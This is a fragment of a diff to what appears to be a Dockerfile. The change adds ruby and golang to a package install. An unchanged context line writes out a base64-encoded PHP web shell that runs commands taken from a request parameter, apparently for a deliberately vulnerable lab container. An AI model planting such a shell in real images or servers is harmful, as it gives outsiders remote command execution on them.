@@ -6,7 +6,7 @@ RUN echo "PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbW
 
 RUN apt update
 
-RUN apt install python3 -y
+RUN apt install python3 ruby golang -y
 
 EXPOSE 80
 
